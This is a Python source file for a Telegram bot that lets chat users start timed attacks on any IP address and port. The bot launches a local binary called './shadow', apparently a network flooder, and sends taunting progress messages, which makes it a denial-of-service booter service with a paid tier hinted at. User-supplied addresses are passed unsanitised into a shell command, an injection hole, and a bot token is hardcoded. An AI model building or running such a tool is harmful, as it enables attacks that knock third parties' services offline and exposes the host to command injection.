import telebot
import time
import random
import threading
import subprocess

TOKEN = "7094229080:AAEDql1mLp-JEEpw9n9vBzRDfVZ965mzPy8"  # Replace with your bot token
bot = telebot.TeleBot(TOKEN)

active_attacks = {}
cooldowns = {}

random_messages = [
    "How’s the attack going?",
    "This is still going on!",
    "🔥 The battlefield is heating up!",
    "💀 Enemies won’t survive this!",
    "🚀 Attack in progress, no mercy!",
    "💣 Boom! Something is going down!",
    "🛡️ Hold your ground! Attack still running.",
    "Why are others waiting? Don’t wait too much!",
    "Please use me, I’m getting bored.",
    "Want to go paid? Contact the developer!",
    "Hey you! What are you watching? Don’t you have to study?",
    "Always the same busy days.",
    "⏳ Patience, warrior! The attack is still live.",
    "💥 Explosions everywhere! Stay tuned.",
    "⚔️ The fight is intense! Keep watching.",
    "🕶️ Are you just watching? Attack harder!",
    "🔄 Once this ends, another one begins!"
]

@bot.message_handler(commands=["attack"])
def attack_command(message):
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "Usage: `/attack <ip> <port>`", parse_mode="Markdown")
        return

    ip, port = args[1], args[2]
    user_id = message.from_user.id

    if user_id in cooldowns and cooldowns[user_id] > 0:
        bot.reply_to(message, f"⚠️ You must wait `{cooldowns[user_id]}` seconds before attacking again.", parse_mode="Markdown")
        return

    keyboard = telebot.types.InlineKeyboardMarkup()
    keyboard.add(telebot.types.InlineKeyboardButton("🎲 Auto", callback_data=f"auto_{user_id}_{ip}_{port}"))
    keyboard.add(telebot.types.InlineKeyboardButton("✍️ Manual", callback_data=f"manual_{user_id}_{ip}_{port}"))

    bot.send_message(message.chat.id, "Choose attack mode:", reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith("auto_") or call.data.startswith("manual_"))
def attack_mode_selection(call):
    data = call.data.split("_")
    mode, user_id, ip, port = data[0], int(data[1]), data[2], data[3]

    if call.from_user.id != user_id:
        bot.answer_callback_query(call.id, "⚠️ This isn't your attack session!", show_alert=True)
        return

    if mode == "auto":
        duration = random.choice([120, 180, 240, 300])
        start_attack(call, user_id, ip, port, duration)
    elif mode == "manual":
        keyboard = telebot.types.InlineKeyboardMarkup()
        for sec in [120, 180, 300]:
            keyboard.add(telebot.types.InlineKeyboardButton(f"{sec} sec", callback_data=f"start_{user_id}_{ip}_{port}_{sec}"))
        bot.edit_message_text("Choose attack duration:", call.message.chat.id, call.message.message_id, reply_markup=keyboard)

@bot.callback_query_handler(func=lambda call: call.data.startswith("start_"))
def manual_attack_selection(call):
    data = call.data.split("_")
    _, user_id, ip, port, duration = data
    duration = int(duration)

    if call.from_user.id != int(user_id):
        bot.answer_callback_query(call.id, "⚠️ This isn't your attack session!", show_alert=True)
        return

    start_attack(call, int(user_id), ip, port, duration)

def start_attack(call, user_id, ip, port, duration):
    global active_attacks, cooldowns

    cooldowns[user_id] = duration * 2  # Cooldown starts immediately
    full_command = f"./shadow {ip} {port} {duration} 50"
    subprocess.Popen(full_command, shell=True)

    bot.edit_message_text(
        f"🔥 **Attack started!**\nTarget: `{ip}:{port}`\nDuration: `{duration}` sec\n⚡ Cooldown started!", 
        call.message.chat.id, call.message.message_id, parse_mode="Markdown"
    )

    thread = threading.Thread(target=attack_countdown, args=(user_id, duration, call.message.chat.id))
    thread.start()

def attack_countdown(user_id, duration, chat_id):
    global cooldowns

    while duration > 0:
        if duration % 10 == 0:
            bot.send_message(chat_id, random.choice(random_messages))

        time.sleep(1)
        duration -= 1
        cooldowns[user_id] -= 1

        if duration % 30 == 0:  # Update message every 30 sec
            bot.send_message(chat_id, f"🔥 **Attack ongoing...** `{duration}` sec left!", parse_mode="Markdown")

    bot.send_message(
        chat_id,
        "✅ **Attack finished!**\nThank you for using me!\n💬 Share your thoughts about our developer.",
        parse_mode="Markdown"
    )

bot.polling(none_stop=True)